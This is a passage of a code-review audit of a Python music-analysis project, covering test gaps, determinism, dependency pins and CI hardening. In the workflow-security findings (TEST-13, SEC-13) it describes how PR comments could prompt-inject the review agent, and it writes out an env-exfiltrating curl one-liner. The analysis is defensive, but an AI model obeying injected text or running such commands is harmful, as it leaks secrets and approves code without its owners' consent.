Use one shared `assert_lyrics_invariants(doc)` helper in every lyrics test.

**Verifier's notes.** Confirmed. _run_chain (test_m4_smoke.py:437-454) ingests without --lyrics, so aligned mode never meets real Whisper output. The stubbed aligned test (L333-367) asserts neither word monotonicity nor >=90% word coverage. The transcription check counts 3 of 5 chosen words (L539-541), i.e. 3 of the sentence's 9 tokens. The degenerate test (L457-486) has no vocal activity at all (language_source is default_no_vocal_activity), so 'untranscribed_regions covering the vocal-activity span' is vacuous. Only the hallucination-count loosening is recorded (007:88-99), and 007:15-18 accepts that slow verification rests on CI, not that the thresholds are loosened. No test asserts the schema's 'Sorted, monotone, within the line span' word invariant (lyrics.schema.json:66).

**Verifier's correction to the proposal.** As proposed, with one note. The aligned slow test must ingest into a fresh library: re-running `mrw ingest <same file> --lyrics f` on an already-ingested track is a silent no-op, because ingest.py:176-183 returns before lyrics are registered. That behaviour itself deserves a fix and a fast test. To bound CI cost, build the espeak mix once per module and run both the aligned and transcribed chains from it, which costs one extra 20 s separation.

#### LYR-12: PLAN §11 M4 smoke test was never run for the aligned path on real audio; the transcription criterion is weakened and parser/aligner edge cases are untested

- **Severity:** medium · **Verdict:** confirmed · **Kind:** test-gap · **Effort:** M · **Confidence:** high · **Checklist:** T1, T2
- **Locations:** `tests/test_m4_smoke.py:457-564`, `tests/test_m4_smoke.py:540-541`, `tests/test_m4_smoke.py:333-367`, `tests/test_m4_smoke.py:199-222`, `PLAN.md:527-533`

**Evidence.** PLAN.md:527-533 requires: 'matching text file → alignment path produces monotonically increasing word times covering ≥ 90 % of words; transcription path on the same audio yields ≥ 80 % token overlap'. The only real-engine tests (test_m4_smoke.py:457-564) run transcribed mode. Aligned mode is exercised only through a stubbed engine (333-367) with two hinted, non-repeating lines. The espeak test asserts `hits >= 3` out of 5 chosen keywords (540-541) rather than ≥ 80% token overlap. The parser test (199-222) covers only bracketed headers and mm:ss.xx. There are no aligner tests for repeated lines, offset hints or count mismatches, and no test of the vocal-stem prerequisite path (lyrics.py:452-461). No review records these relaxations.

**Proposal.** Add a slow test that reuses the espeak fixture with a matching .txt, plus an .lrc with exact hints and one with hints shifted by 25 s. Assert that ≥ 90% of supplied words are anchored, that word times are monotone across the whole document, and that no observed word span is reused. Tighten the transcription assertion to ≥ 80% token overlap, or record the relaxation in review 007 (P1). Add fast tests for the parser variants (BOM, CRLF, multi-tag, ID tags, cp1252) and for repeated-chorus and offset-hint alignment.

**Verifier's notes.** I checked tests/test_m4_smoke.py. The two real-engine tests (:457-564) run only in transcribed mode. Aligned mode is exercised only with a stubbed engine and two hinted, non-repeating lines (:333-367). The espeak test asserts `hits >= 3` out of 5 keywords (:540-541), not ≥ 80% token overlap. The parser test (:199-222) covers only bracketed headers and mm:ss.xx. There are no aligner tests for repeated lines, offset hints or word-count mismatches. The prerequisite test (:384-407) covers the missing-features path but not the vocal-stem path (lyrics.py:452-461). So T1 is unmet for the PLAN.md:527-533 aligned-path criterion. Review 007 records only the no-vocals relaxation.

**Verifier's correction to the proposal.** The proposal is sound. The espeak fixture is a single sentence, which makes the ≥ 90% criterion weak. Synthesize 3-4 lines separated by gaps, including one repeated line, so that the aligned smoke test also guards LYR-1 and LYR-2.

#### FEAT-10: Features has no T4 mid-stage failure test, and every fast fixture is a best case for the heuristic it exercises

- **Severity:** medium → low · **Verdict:** confirmed · **Kind:** test-gap · **Effort:** M · **Confidence:** high · **Checklist:** T1, T3, T4
- **Locations:** `tests/test_m3_smoke.py:97-105`, `tests/test_m3_smoke.py:225-238`, `tests/test_m3_followups.py`, `mrw/features.py:366-376`, `tests/test_m4_smoke.py:410`

**Evidence.** The only features failure path tested is the prerequisite error (test_m3_smoke.py:225-238, exit 2). The `except Exception` branch that records `status: failed` with the error and exits 1 (features.py:368-376) is never exercised. Lyrics has the equivalent T4 test (test_m4_smoke.py:410 `test_lyrics_engine_failure_records_failed`). Each fixture is the easy case for its heuristic: (a) Silent stems are bit-exact zeros (test_m3_smoke.py:98), the only input whose onset envelope is exactly zero (FEAT-1). (b) 120 BPM falls exactly on a tempogram bin (FEAT-6). (c) Downbeats are amplitude accents (FEAT-4). (d) There is no beatless, near-silent, sparse, silent-mix or sub-400 ms fixture. (e) The 0.15 s region tolerance hides end_seconds 5.01 > duration (FEAT-7). (f) Series length, a PLAN §11 M3 smoke item, is not asserted.

**Failure scenario.** Regressions in the failure path and the defects in FEAT-1/4/6/7/8 all pass the suite. For example, a stem written at 48 kHz makes `_load` raise FeaturesError (features.py:87-88), but no test checks that the manifest records failed, that the previous audio_features.json survives, and that the exit code is 1.

**Proposal.** Add fast tests with generated fixtures (T3): (1) T4: plant a 48 kHz bass.flac, or monkeypatch `_integrated_lufs` to raise, and assert exit 1, manifest failed with the error, and the prior document untouched. (2) Dither-only and −55 dB bleed stems give empty or gated onsets. (3) A 124 BPM click track gives bpm within ±0.3. (4) A pink-noise or drone mix gives confidence < 0.5. (5) Backbeat drums put the downbeat on the kick. (6) A silent mix and a 0.3 s input give a schema-valid document under the chosen convention. (7) The length and domain assertions from FEAT-7. Run every document through the existing `_validate`.

**Verifier's notes.** Accurate. The only features failure path tested is the exit-2 prerequisite error (test_m3_smoke.py:225-238). The `except Exception` → failed → exit-1 branch (features.py:368-376) is never exercised, while stems, lyrics and video each have a T4 test (test_m2_smoke.py:221, test_m4_smoke.py:410, test_m5_smoke.py:407). Every fixture is a best case: bit-exact-zero stems (test_m3_smoke.py:98), 120 BPM exactly on a tempogram bin, amplitude-accented downbeats, and no length assertion. Downgraded to low. The failure path mirrors stages that are tested, and the other fixture items are the regression tests for FEAT-1/3/5/6/7/8, which should ship with those fixes rather than as separate work.

**Verifier's correction to the proposal.** Add only the T4 test standalone: monkeypatch `mrw.features._integrated_lufs` to raise, then assert exit 1, manifest audio_features status 'failed' with the error, and the prior audio_features.json byte-identical. Land each heuristic fixture together with the fix it guards, and run every document through `_validate`.

### I3. No end-to-end determinism run; paid path never executed

#### TEST-7: No end-to-end determinism check; double-run gaps remain on merged stages, and AnthropicBackend's request/parse path is never executed

- **Severity:** medium · **Verdict:** confirmed · **Kind:** test-gap · **Effort:** L · **Confidence:** high · **Checklist:** T2, D1, D5 · **Already recorded in the repo docs**
- **Locations:** `PLAN.md:440-441`, `PLAN.md:546-549`, `tests/test_m4_smoke.py:370-381`, `tests/test_m5_smoke.py:320-389`, `mrw/captions.py:102-140`, `tests/test_m0_smoke.py:102-106`

**Evidence.** PLAN.md:440-441 calls for '5. **CI check** (once implemented): analyze a fixture twice, `diff -r` the track dir minus `manifest.json`', and the M7 smoke is at L548-549; neither exists. Double-run coverage today: source.json (m0:102-106, m1:153-161), stems (m2, slow), audio_features.json on fabricated stems only (m3:214-222), lyrics.json in transcribed mode only (m4:370-381 calls `_fabricate` without lyrics_text, and both slow re-runs also use `_run_chain` without --lyrics), and video.json plus frames with the null backend (m5:271-288). Never compared: source_audio.flac, aligned-mode lyrics.json, anthropic-backend video.json across two runs, caption-cache files, and the whole track dir. All double-runs happen in one process. M7 pieces that exist: AnthropicBackend and cache (captions.py:83-140), `mrw models fetch` (cli.py:249-261, untested), budget gate and ledger. Missing: the mock-HTTP double-run, batch mode (`mrw analyze --all`, PLAN.md:460-461; there is no `analyze` command), and the end-to-end check. The cache-miss path (captions.py:108-139) runs in no test: test_m5_smoke.py:329-336 hand-seeds the cache, and L386-389 replaces make_backend entirely. On a miss the code does `text_block = next(b.text ...)` and `parsed = json.loads(text_block)` (L133-134) before `self.cache.put` (L139).

**Failure scenario.** If the captioning model wraps its answer in a ```json fence (plausible despite 'STRICT JSON, no prose'; moderate confidence), json.loads raises after the call has been billed. Nothing is cached, so the stage fails with partial spend and every retry pays for the same shot again. No current test can detect this. Separately, nondeterminism in ingest's FLAC output or in aligned-mode lyrics would pass every existing double-run test.

**Proposal.** Add tests/test_e2e_determinism.py (slow) or an equivalent CI job. Build one A/V fixture (cuts on beats, espeak speech, a matching .lrc). Run ingest → stems (cpu) → features → lyrics → video via `subprocess.run([sys.executable, '-m', 'mrw.cli', ...])` twice, into two library roots with different PYTHONHASHSEED. Compare the trees recursively excluding manifest.json, and check that each manifest content_sha256 equals the sha256 of its file. For captions, point ANTHROPIC_BASE_URL at a localhost stub that serves canned Messages responses, including one fenced variant: run 1 must populate the cache, run 2 must make 0 requests and produce byte-identical video.json.

**Verifier's notes.** Confirmed. PLAN §7.5 and the M7 smoke (PLAN.md:440-441, 546-550) are unimplemented, and there is no `analyze` command. Double-run coverage is exactly as listed: aligned mode only in a single stubbed run (test_m4_smoke.py:333-367), and features on a real separation run once (test_m3_smoke.py:241-269). AnthropicBackend.caption's cache-miss path (captions.py:108-140) never executes: the replay test seeds the cache (test_m5_smoke.py:329-336), and the partial-spend test replaces make_backend (L386-389). On a miss, calls and tokens are counted (L130-132) before `json.loads(text_block)` (L134) and cache.put (L139). Any non-JSON reply (a ```json fence, a preamble, or truncation at max_tokens=300) therefore fails the stage after billing, caches nothing, and every retry re-bills the same shot. There is no stop_reason check. Whether the model fences despite 'STRICT JSON' is model behaviour I cannot verify offline; moderate likelihood. The end-to-end check itself is recorded M7 roadmap (already known). The untested shipped miss path and the parse-after-billing fragility are new.

**Verifier's correction to the proposal.** Re-order by value.
(1) S: a fast unit test of AnthropicBackend.caption with a fake `anthropic` client, or with ANTHROPIC_BASE_URL (which the Python SDK honours) pointed at a loopback stub. Cover miss then put then hit, a fenced reply, and stop_reason='max_tokens'.
(2) S: make the reply parseable by construction. Request structured outputs (`output_config.format` with a {text, tags} JSON schema; Claude Haiku 4.5 supports it), or at least strip one fenced block and check stop_reason before json.loads.
(3) Do not add the temperature=0 that PLAN.md:308 promises: sampling parameters return a 400 on API version 2026-10-21 for every model. Update PLAN to say caption determinism rests on the cache alone. Consider adding a hash of PROMPT_TEMPLATE and max_output_tokens to cache_key, so a template edit without a prompt_version bump cannot replay stale captions.
(4) S: a stubbed aligned-mode double-run.
(5) The cross-process end-to-end diff stays M7 work (L).

### I4. T5 cannot be verified

#### TEST-12: T5 is asserted but can't be verified with the project's own tooling: the neural dependencies are mandatory and CI installs everything

- **Severity:** medium · **Verdict:** confirmed · **Kind:** ci · **Effort:** S · **Confidence:** high · **Checklist:** T5
- **Locations:** `pyproject.toml:6-23`, `.github/workflows/claude-review.yml:70`, `tests/test_m3_followups.py:82`, `tests/test_m4_smoke.py:387-391`, `docs/reviews/007-m4-lyrics.md:11-14`

**Evidence.** pyproject.toml:9-16 lists demucs, torch, torchaudio and faster-whisper as required [project] dependencies. No extra or group lets `uv sync` build T5's 'environment without the neural dependencies', and CI runs a full `uv sync` (L70). Only two tests block heavy imports, each for a single prerequisite path: test_m3_followups.py:82 `monkeypatch.setitem(sys.modules, "torch", None)` and test_m4_smoke.py:387-391 (torch and faster_whisper). The last evidence is review 007:11-14, a manual torchless run at M4 (34 passed); the fast suite has since grown to 49 tests. My AST trace found that no mrw module imports a heavy package at module level: cli.py imports stage modules inside commands, and the heavy imports are function-level (anthropic at captions.py:110; cv2, sklearn and scenedetect at video.py:105-107 and 277; torch and demucs at stems.py:54-75; librosa and faster_whisper at lyrics.py:129-155). The fast tests need numpy, soundfile, librosa (with numba, scipy and scikit-learn) and pyloudnorm for the m3/m4 features runs, plus rapidfuzz, opencv and scikit-learn (palette, motion), Pillow, jsonschema, and ffmpeg/ffprobe with libx264 and ALAC. They need none of torch, torchaudio, demucs, faster_whisper, ctranslate2, scenedetect or anthropic, and neither espeak-ng (used only by the slow, skipif-guarded test at test_m4_smoke.py:507) nor macOS `say` (unused). T5 holds today, but only by inspection.

**Failure scenario.** A refactor adds a module-level `import anthropic` to captions.py or a torch import in features for a new helper. The fast suite silently starts requiring the neural deps, and nothing fails until someone repeats review 007's manual torchless run.

**Proposal.** In the CI fast job, run `uv sync --locked --no-install-package torch --no-install-package torchaudio --no-install-package demucs --no-install-package faster-whisper --no-install-package ctranslate2 --no-install-package anthropic`, then `uv run --no-sync pytest -m 'not slow'`; `--no-sync` matters because a plain `uv run` would reinstall them. As a second line of defence, when MRW_T5_GUARD=1, have conftest's pytest_configure insert a sys.meta_path finder that raises ImportError('T5: fast test imported X') for those top-level names. Optionally move these packages to `[project.optional-dependencies] neural`.

**Verifier's notes.** Confirmed. torch, torchaudio, demucs and faster-whisper are mandatory dependencies (pyproject.toml:9-16). CI runs a full `uv sync` (claude-review.yml:70). Only two tests block heavy imports, each for a single path (test_m3_followups.py:82, test_m4_smoke.py:387-391). My own reading of every mrw module's top level agrees that no heavy package is imported at module scope, so T5 holds today, but only by inspection. The last evidence is 007:11-14 (34 fast tests), against 49 fast tests now (62 total minus 13 slow). This regression class has precedent: 006 F-2 records PR #5 silently breaking torchless runs. One minor overstatement: uv itself can build such an environment (`--no-install-package`); the gap is that nothing runs it.

**Verifier's correction to the proposal.** As proposed. `--no-install-package` leaves the excluded packages' own transitive dependencies installed, which is harmless. The sys.meta_path guard is the more robust check, because it also catches imports of packages that happen to be installed.

### I5. Review workflow needs hardening

#### TEST-13: Review workflow hardening: actions pinned by mutable tags, an allowlist where `uv run:*` means arbitrary commands, `uv sync` without --locked, cache keys that never refresh

- **Severity:** medium · **Verdict:** confirmed · **Kind:** security · **Effort:** S · **Confidence:** high
- **Locations:** `.github/workflows/claude-review.yml:23-28`, `.github/workflows/claude-review.yml:30`, `.github/workflows/claude-review.yml:38`, `.github/workflows/claude-review.yml:45-55`, `.github/workflows/claude-review.yml:57-59`, `.github/workflows/claude-review.yml:70`, `.github/workflows/claude-review.yml:91`, `docs/reviews/004-pr1-review-automation.md:14-16`

**Evidence.** Actions are pinned by tag, not commit SHA: L30 `actions/checkout@v4`, L38 `astral-sh/setup-uv@v5`, L46 and L52 `actions/cache@v4`, L57 `anthropics/claude-code-action@v1`. The last one receives CLAUDE_CODE_OAUTH_TOKEN (L59) in a job that has `pull-requests: write` and `id-token: write` (L27-28). The allowlist at L91 includes `Bash(uv sync:*)` and `Bash(uv run:*)`. `uv run` executes any command (`uv run sh -c ...`, `uv run curl ...`), so the agent's tool surface is effectively unrestricted, although review 004:14-16 calls it 'tightly scoped'. Review 004:52-56 already accepts that PR code sees the secret for write-access authors; that part is not re-reported. The new point is that the agent itself can run arbitrary commands if something it reads prompt-injects it. L70 runs `uv sync` without --locked/--frozen: if a PR edits pyproject.toml without relocking, uv silently re-resolves and rewrites uv.lock in the runner, so CI tests an environment nobody committed. The uv version is unpinned. Cache keys are static (L49 `demucs-htdemucs`, L55 `whisper-small`): actions/cache skips saving on an exact hit, so these caches are saved once and never refreshed, and the comment relies on someone bumping them by hand.

**Failure scenario.** A retargeted claude-code-action@v1 tag, from an upstream compromise or a breaking release, runs on the next PR with the OAuth token and permission to mint OIDC tokens. Or text in a PR diff or test output steers the agent to `uv run sh -c 'env | curl --data-binary @- https://...'`, which the allowlist permits.

**Proposal.** Pin every action to a full commit SHA and let Dependabot (github-actions ecosystem) update them. Once tests move to the read-only job (TEST-1), remove `Bash(uv sync:*)` and `Bash(uv run:*)` from --allowedTools and give the agent `Bash(gh pr checks:*)` and `Bash(gh run view:*)` instead. Use `uv sync --locked` everywhere and pin `version:` in setup-uv. Derive cache keys from their inputs, e.g. `models-${{ hashFiles('mrw/config.py', 'uv.lock') }}` with a restore-keys prefix. Land the workflow change on main between review cycles (review 005 note 1).

**Verifier's notes.** Confirmed. All five actions are pinned by tag (L30, 38, 46, 52, 57). The allowlist (L91) includes `Bash(uv run:*)`, and `uv run sh -c ...` or `uv run python -c ...` match that prefix, so the agent's shell is effectively unrestricted. Review 004:14-16 called it 'tightly scoped' without considering this. Under 004's threat model, PR diffs and test output come from write-access authors. The realistic injection vector is therefore third-party comments on a public-repo PR, which the agent can read through the allowed `gh pr view --comments`. Combined with `id-token: write` and PR write permission, that is a meaningful escalation. Also: `uv sync` without --locked re-resolves when the lock is outdated, setup-uv has no version pin, and the static cache keys (L49, L55) are never re-saved after an exact hit.

**Verifier's correction to the proposal.** As proposed. Until TEST-1 lands, narrow the allowlist to `Bash(uv sync --locked:*)` and `Bash(uv run --no-sync pytest:*)`; pytest can still load plugins, but sh, curl and python -c are excluded. Keep `id-token: write`, which the action's OIDC auth needs. With hashFiles-based model-cache keys, add a restore-keys prefix so a changed key restores the previous cache instead of re-downloading about 0.5 GB.

#### SEC-13: Review workflow: `Bash(uv run:*)` is an unrestricted shell, actions are pinned to mutable tags, and caches never warm across PRs

- **Severity:** medium · **Verdict:** plausible · **Kind:** security · **Effort:** S · **Confidence:** medium
- **Locations:** `.github/workflows/claude-review.yml:91`, `.github/workflows/claude-review.yml:30`, `.github/workflows/claude-review.yml:57`, `.github/workflows/claude-review.yml:8`, `.github/workflows/claude-review.yml:45`

**Evidence.** Allowlist: line 91 allows `mcp__github_inline_comment__create_inline_comment, Bash(gh pr comment:*), Bash(gh pr diff:*), Bash(gh pr view:*), Bash(uv sync:*), Bash(uv run:*)`. `uv run <cmd>` will run any program on PATH, so `uv run gh pr review --approve`, `uv run gh api ...` and `uv run sh -c 'curl ...'` all match the allowlist. The prompt's 'do NOT approve / do NOT push' rules (86-88) are therefore enforced only by the prompt itself, while the job holds `pull-requests: write` (27) and CLAUDE_CODE_OAUTH_TOKEN.

Why this is new: review 004 lists 'tightly scoped --allowedTools' as confirmed right and limits its threat model to users with write access. But `Bash(gh pr view:*)` also lets the agent read PR comments (`--comments`). Any GitHub user can comment on a public repo's PR, so that is a third-party prompt-injection channel into an unrestricted shell.

Supply chain: every action is pinned to a mutable tag (`actions/checkout@v4`:30, `astral-sh/setup-uv@v5`:38, `actions/cache@v4`:46/52, `anthropics/claude-code-action@v1`:57). checkout also keeps its default persist-credentials.

Caches: the workflow triggers only on `pull_request` (8-10). Caches saved by actions/cache (45-55) and setup-uv (40) are therefore scoped to refs/pull/N/merge, and only re-runs of that same PR can restore them. Each new PR downloads the Demucs and Whisper weights and builds the venv from cold.

**Failure scenario.** An outside user posts instructions as a comment on an open same-repo PR. On the next push, the reviewer runs `gh pr view --comments` for context and then executes `uv run gh pr review --approve`, satisfying a one-approval branch rule, or exfiltrates the OAuth token. Separately, a retagged or compromised `@v1` action would run with that token, as in the 2025 tj-actions incident. On the cost side, every PR's first review run pays for a full cold install and model download.

**Proposal.** Narrow the allowlist to `Bash(uv run pytest:*)` and `Bash(uv sync --frozen:*)`. Pin every action to a full commit SHA, and let Dependabot update github-actions. Set `persist-credentials: false` on checkout. Add a cache-warming job triggered on `push: branches: [main]` (or `workflow_dispatch`) that uses the same cache keys, so PR runs can restore from main's scope. Per review 005's post-merge note 1, land this change on main between review cycles.

**Verifier's notes.** claude-review.yml:91 allowlists `Bash(uv run:*)`. `uv run <cmd>` executes any program, so the allowlist does not actually bound the agent's shell (`uv run gh pr review --approve`, `uv run sh -c ...`). `Bash(gh pr view:*)` also permits `--comments`, which on a public repo brings third-party text into the agent's context. That is a new argument beyond review 004's write-access-only threat model. I cannot verify from here whether an injected agent's Bash subprocesses can see CLAUDE_CODE_OAUTH_TOKEN, or whether an app approval would satisfy branch protection, so this stays plausible. Confirmed facts: every action is pinned to a mutable tag (lines 30, 38, 46, 52, 57), and checkout uses the default persist-credentials. The cache claim matches GitHub's documented scoping: caches created by pull_request runs are scoped to refs/pull/N/merge, and this workflow never runs on main, so each new PR starts cold. The fix is S effort.

**Verifier's correction to the proposal.** As proposed: narrow the allowlist to `Bash(uv sync:*)` and `Bash(uv run pytest:*)`; pin actions by full SHA and let Dependabot update them; set `persist-credentials: false`; optionally add a push-to-main cache-warming job. Land it on main between PR review cycles (review 005, post-merge note 1).

### I6. Python range and torch pin

#### TEST-14: requires-python ">=3.11" is broader than what installs on the target: torch 2.5.1 has macOS arm64 wheels only for cp311 and cp312, and no Python version is pinned locally or in CI

- **Severity:** medium · **Verdict:** confirmed · **Kind:** ci · **Effort:** S · **Confidence:** high
- **Locations:** `pyproject.toml:5`, `pyproject.toml:11-13`, `uv.lock:2376-2400`, `.github/workflows/claude-review.yml:37-40`

**Evidence.** pyproject.toml:5 sets `requires-python = ">=3.11"`, and :11-13 cap torch and torchaudio at `">=2.4,<2.6"` (the demucs checkpoint constraint). In uv.lock, the PyPI torch 2.5.1 entry used for sys_platform != 'linux', including the resolution marker `python_full_version >= '3.13' and sys_platform != 'linux'`, lists only `cp311-none-macosx_11_0_arm64` and `cp312-none-macosx_11_0_arm64` wheels (plus win cp311/cp312). torchaudio is the same, and the Linux CPU wheels cover only cp311–cp313. The repo has no .python-version, and setup-uv (L37-40) gets no python-version input, so CI uses whatever python3 the runner image ships (3.12 on ubuntu-24.04). The 3.11 floor is never executed, and the tested interpreter changes whenever the image does.

**Failure scenario.** On a fresh clone on an Apple Silicon Mac where uv picks Python 3.13 or later (Homebrew's default python3, or a managed CPython auto-download), `uv sync` fails because torch 2.5.1 has no cp313 macOS wheel. That contradicts README/CLAUDE.md's 'Python 3.11+'. CI will break the day the runner's python3 becomes 3.14, since there is no cp314 torch wheel on Linux either.

**Proposal.** Commit a .python-version (3.12) and narrow requires-python to ">=3.11,<3.13" until torch can move past 2.5. Alternatively, declare `[tool.uv] required-environments` for darwin-arm64 and linux-x86_64 so that `uv lock` refuses platforms it can't satisfy. In CI, pass python-version to setup-uv with a 3.11/3.12 matrix for the fast job, and update the README/CLAUDE.md wording.

**Verifier's notes.** Confirmed from uv.lock. The PyPI torch 2.5.1 entry used for sys_platform != 'linux' has resolution markers that include python >= 3.13 (uv.lock:2376-2400), yet it ships only cp311/cp312 macOS-arm64 and Windows wheels. The Linux CPU build covers only cp311 to cp313 (L2401-2420), and torchaudio matches. requires-python is '>=3.11' (pyproject.toml:5, uv.lock:3), and there is no .python-version. uv selects an interpreter by requires-python, not by wheel availability (high confidence). On a fresh Apple Silicon machine whose discovered or auto-downloaded Python is 3.13 or 3.14, `uv sync` therefore fails with 'no wheel for the current platform'. CI's interpreter is whatever the runner image provides. This is a setup break, not output corruption, so medium.

**Verifier's correction to the proposal.** As proposed. Re-run `uv lock` after narrowing requires-python, and change 'Python 3.11+' in README.md and CLAUDE.md:27 to '3.11-3.12'.

#### ARCH-4: The demucs 4.0.1 pin forces torch<2.6, so the declared Python 3.11+ cannot install on 3.13+ on the target platform, and the neural stack is stuck on an unmaintained, CVE-flagged base

- **Severity:** high → medium · **Verdict:** confirmed · **Kind:** robustness · **Effort:** M · **Confidence:** high
- **Locations:** `pyproject.toml:5`, `pyproject.toml:9`, `pyproject.toml:11`, `uv.lock:2376`, `uv.lock:2441`, `mrw/stems.py:60`, `README.md:18`

**Evidence.** pyproject.toml declares `requires-python = ">=3.11"` (line 5) and `"demucs==4.0.1"` (line 9). Lines 11-13 read `# demucs 4.0.1 checkpoints fail torch>=2.6 (weights_only default flip)`, `"torch>=2.4,<2.6"`, `"torchaudio>=2.4,<2.6"`. README.md:18 says 'Python 3.11+', and there is no .python-version file. In uv.lock:2376-2400, the PyPI torch 2.5.1 entry is the resolution for `python_full_version >= '3.13' and sys_platform != 'linux'` (uv.lock:2380). Its only macOS arm64 wheels are cp311 and cp312 (uv.lock:2395, 2397), and there is no sdist. torchaudio 2.5.1 likewise has macOS wheels only for cp311/cp312 (uv.lock:2441-2459), and its Linux +cpu build covers only cp311/cp312. demucs also pulls in training-only infrastructure: dora-search, lameenc, openunmix and julius (uv.lock:436ff), and through dora-search, submitit, omegaconf, retrying and treetable (uv.lock:475ff). mrw itself uses only `demucs.pretrained.get_model` and `demucs.apply.apply_model` (stems.py:62-75), and stems.py:9-12 already notes that `demucs.api` exists only in unreleased 4.1 alphas. The version floors equal the locked versions and have no upper bounds (pyproject.toml:14-22, e.g. `opencv-python-headless>=5.0.0.93`, `scikit-learn>=1.9.0`, `anthropic>=0.116.0`, `pillow>=12.3.0`). These are exactly the libraries whose numerics and encoders determine document and JPEG bytes. Assumptions behind this finding: uv refuses to install a locked package with no matching wheel and no sdist (high confidence). Without a .python-version file, a fresh Mac usually picks Homebrew's Python or uv's newest download, which is 3.13 or 3.14 (fairly confident). CVE-2025-32434 (a torch.load weights_only=True bypass leading to remote code execution) affects torch <= 2.5.1 and is fixed in 2.6.0 (fairly confident, about 80%). The author has marked facebookresearch/demucs as unmaintained (moderate confidence). torch.hub verifies `check_hash` only at download time and then unpickles the cached file on every load (fairly confident).

**Failure scenario.** A contributor on an Apple Silicon Mac, whose first-found or uv-downloaded Python is 3.13 or 3.14, runs `uv sync` as README says. uv must install torch==2.5.1, finds no cp313/cp314 macOS wheel and no sdist, and aborts before any test can run. On Linux with 3.13 the install fails on torchaudio instead. CI never notices, because it runs ubuntu with system Python 3.12. Security scanners will flag torch 2.5.1. The practical risk here is narrower: demucs fully unpickles the cached checkpoint whatever weights_only says, so a replaced ~/.cache/torch/hub/checkpoints/*.th file would execute code on `mrw stems`. But the pin also blocks every torch fix, possibly including MPS op-coverage improvements relevant to the MPS-to-CPU fallbacks in review 005 F-1 (speculative).

**Proposal.** (1) Now (S): commit `.python-version` set to 3.12, change to `requires-python = ">=3.11,<3.13"`, document this in README and CLAUDE.md, and add the macos-14 CI job (ARCH-3). (2) Next (M): load the checkpoint in mrw's own code so the torch pin can be lifted. Map the htdemucs signature to its URL and download it with `torch.hub.download_url_to_file(url, dst, hash_prefix=...)`. Re-check the sha256 prefix on every load, not just at download. Then load the verified file with `torch.load(dst, map_location="cpu", weights_only=False)`, or with `weights_only=True` plus `torch.serialization.add_safe_globals` for the demucs classes, and pass the result to `demucs.states.load_model`. Run the M2 slow suite (CPU double-run identity and the silent-input case) on torch>=2.6 before relaxing the bound. (3) Later (L; record the choice in OPEN_QUESTIONS): either vendor the MIT-licensed HTDemucs inference code and drop demucs, dora-search, submitit, omegaconf, lameenc, treetable and retrying, or adopt a maintained wrapper. (4) Treat dependencies that change outputs, or that have breaking major versions, deliberately. Either add upper bounds (`anthropic<1`, `opencv-python-headless<6`, `scikit-learn<2`, `pillow<13`, `librosa<0.12`, `scenedetect<0.8`), or keep the floors but make every lock upgrade a reviewed event that runs the determinism suite and bumps the affected stage algorithm versions (ARCH-6).

**Verifier's notes.** uv.lock confirms the claim. The PyPI torch 2.5.1 entry (marker python>=3.13, non-linux) lists only cp311/cp312 macOS arm64 and win wheels and no sdist; torchaudio 2.5.1 is the same. On Linux, torch 2.5.1+cpu has a cp313 x86_64 wheel, but torchaudio +cpu has only cp311/cp312. requires-python is >=3.11 and there is no .python-version. I am highly confident uv refuses to install a locked distribution with no compatible wheel or sdist, and fairly confident a fresh Mac picks 3.13 or newer. README promises 3.11+. The demucs dependency tail (dora-search→submitit/omegaconf/retrying/treetable, lameenc, openunmix) is in the lock. The output-affecting floors equal the locked versions (librosa 0.11.0, opencv 5.0.0.93, scikit-learn 1.9.0, pillow 12.3.0). Re-rated to medium: the operator's environment and CI (ubuntu system Python 3.12) work. This is an install failure on new machines with an S fix. The CVE angle is weak, as the finding concedes, because demucs fully unpickles the checkpoint either way.

**Verifier's correction to the proposal.** Step (1) is fine as proposed. For step (2), try the smaller route first: on torch>=2.6, wrap demucs.pretrained.get_model in torch.serialization.safe_globals([...the demucs model classes...]), which keeps weights_only=True. Validate it with the M2 slow double-run, and hand-roll download plus hash verification only if that fails. Treat any torch bump as a stems-invalidating event, because stem bytes may change (ARCH-1/ARCH-6).

## J. Architecture, docs and roadmap

### J1. Duplication

#### ARCH-13: The same stage lifecycle is copied across five run_* functions and four CLI commands (about 250 lines of scaffolding); extract a shared stage runner

- **Severity:** medium → low · **Verdict:** confirmed · **Kind:** maintainability · **Effort:** L · **Confidence:** high · **Checklist:** D4, H3, T4, T5
- **Locations:** `mrw/video.py:313`, `mrw/lyrics.py:435`, `mrw/stems.py:140`, `mrw/features.py:276`, `mrw/cli.py:78`, `mrw/lyrics.py:472`

**Evidence.** An ast scan shows that the five longest functions in mrw/ are the stage entry points: run_video at 267 lines and 31 branches (video.py:313), run_lyrics 184 (lyrics.py:435), ingest 147 (ingest.py:159), run_stems 128 (stems.py:140) and run_features 101 (features.py:276). In the four post-ingest stages, about 258 of their 680 lines (about 38%) are shared scaffolding: roughly 84 of 128 in stems, 51 of 101 in features, 50 of 184 in lyrics and 73 of 267 in video. The repeated pieces are: (a) resolving the track, reading the manifest and checking 'has no successful ingest', four times (stems.py:141-144, features.py:277-280, lyrics.py:436-439, video.py:316-319); (b) a config-hash no-op check, four times, each returning results with placeholder values (`FeaturesResult(track_id, 0.0, -1, already_done=True)` at features.py:305, `LyricsResult(track_id, "?", -1, -1, already_done=True)` at lyrics.py:470, `VideoResult(track_id, -1, ...)` at video.py:337); (c) `started_at = datetime.now(timezone.utc).strftime(...)` five times and `round(time.monotonic() - t0, 2)` six times; (d) a `_record` closure four times (stems.py:172, features.py:310, lyrics.py:482, video.py:343); (e) the failure path `except PrerequisiteError: raise` / `except Exception: _record(failed); raise XError(str(exc)[:500])` four times (stems.py:243-267, features.py:366-376, lyrics.py:610-618, video.py:555-579); (f) the stems-on-disk check twice, worded differently (features.py:284-296, lyrics.py:450-461); and (g) four near-identical CLI commands (cli.py:78-222). Upstream documents are read as untyped dicts (lyrics.py:472-475, video.py:325, `_vocals_rms_lookup(features_doc: dict)` at lyrics.py:273) while writes go through typed models, so S1 type safety covers only the write side. The copies have already drifted: status covers 3 of 5 stages (ARCH-1), only video records a partial `run` on failure, and message wording differs.

**Failure scenario.** M6 (structure) and M7 (analyze) each need yet another copy of the lifecycle, plus a status line and a CLI wrapper. ARCH-1, ARCH-5 and ARCH-6 add fingerprinting, locking and algorithm versions that every copy must then repeat, in the same order that keeps heavy imports after cheap checks (T5). These are exactly the places where the copies have already diverged; for example, M4 and M5 never updated the status display.

